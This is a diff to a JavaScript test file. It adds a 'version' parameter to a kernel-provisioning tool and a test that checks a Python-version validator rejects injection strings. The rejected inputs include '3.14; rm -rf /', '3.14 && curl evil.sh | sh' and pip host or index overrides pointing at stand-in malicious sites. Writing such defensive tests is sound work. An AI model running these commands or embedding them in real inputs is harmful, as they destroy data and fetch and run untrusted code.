@@ -266,7 +266,7 @@ test("ptc extension bootstraps session tools, the /ptc command, and cleans up ru
     assert.equal(readResult.content[0].text, "cell 3 offset 2 limit 4");
 
     const provisionKernel = registered.find((tool) => tool.name === "provision_kernel");
-    assert.deepEqual(Object.keys(provisionKernel.parameters.properties), ["notebook", "source"]);
+    assert.deepEqual(Object.keys(provisionKernel.parameters.properties), ["notebook", "source", "version"]);
     const promote = registered.find((tool) => tool.name === "promote_to_skill_notebook");
     assert.deepEqual(Object.keys(promote.parameters.properties), ["name", "notebookPath", "overwrite"]);
     const promoted = await promote.execute(
@@ -1085,3 +1085,21 @@ function successResult() {
     },
   };
 }
+test("isValidPythonVersion accepts plain versions and rejects injection attempts", async () => {
+  const { isValidPythonVersion } = require("../dist/utils.js");
+  // Leading/trailing whitespace is trimmed before matching (harmless; the
+  // trimmed value must still match the strict pattern).
+  for (const ok of ["3.14", "3.14.4", "3.15.0b1", "3.14.0rc2", "3.13.1a3", " 3.12 ", " 3.14 "]) {
+    assert.equal(isValidPythonVersion(ok), true, `expected accept: ${ok}`);
+  }
+  for (const bad of [ // (trimmed whitespace is accepted by design; nothing else is)
+    "3.14 --allow-insecure-host my-malware-site.com",
+    "3.14; rm -rf /",
+    "3.14 && curl evil.sh | sh",
+    "3.14 --index-url http://evil",
+    "python3", "3", "v3.14", "3.14.4.1", "3.14.x", "",
+    "3.14.4+mypatch", "3.14.4.post1", "$(echo 3.14)", "3.14 # comment",
+  ]) {
+    assert.equal(isValidPythonVersion(bad), false, `expected reject: ${JSON.stringify(bad)}`);
+  }
+});
